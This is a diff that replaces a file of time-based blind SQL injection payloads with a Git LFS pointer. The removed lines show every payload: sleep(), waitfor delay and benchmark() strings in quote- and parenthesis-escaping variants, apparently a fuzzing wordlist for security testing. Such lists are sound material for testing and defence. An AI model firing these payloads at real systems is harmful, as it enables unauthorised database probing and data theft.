@@ -1,31 +1,3 @@
-sleep(__TIME__)#
-1 or sleep(__TIME__)#
-" or sleep(__TIME__)#
-' or sleep(__TIME__)#
-" or sleep(__TIME__)="
-' or sleep(__TIME__)='
-1) or sleep(__TIME__)#
-") or sleep(__TIME__)="
-') or sleep(__TIME__)='
-1)) or sleep(__TIME__)#
-")) or sleep(__TIME__)="
-')) or sleep(__TIME__)='
-;waitfor delay '0:0:__TIME__'--
-);waitfor delay '0:0:__TIME__'--
-';waitfor delay '0:0:__TIME__'--
-";waitfor delay '0:0:__TIME__'--
-');waitfor delay '0:0:__TIME__'--
-");waitfor delay '0:0:__TIME__'--
-));waitfor delay '0:0:__TIME__'--
-'));waitfor delay '0:0:__TIME__'--
-"));waitfor delay '0:0:__TIME__'--
-benchmark(10000000,MD5(1))#
-1 or benchmark(10000000,MD5(1))#
-" or benchmark(10000000,MD5(1))#
-' or benchmark(10000000,MD5(1))#
-1) or benchmark(10000000,MD5(1))#
-") or benchmark(10000000,MD5(1))#
-') or benchmark(10000000,MD5(1))#
-1)) or benchmark(10000000,MD5(1))#
-")) or benchmark(10000000,MD5(1))#
-')) or benchmark(10000000,MD5(1))#
+version https://git-lfs.github.com/spec/v1
+oid sha256:224a67f0923dee5395c0b00b68d273ebf1ad1baeed8bef292409407a5e27ae3c
+size 911
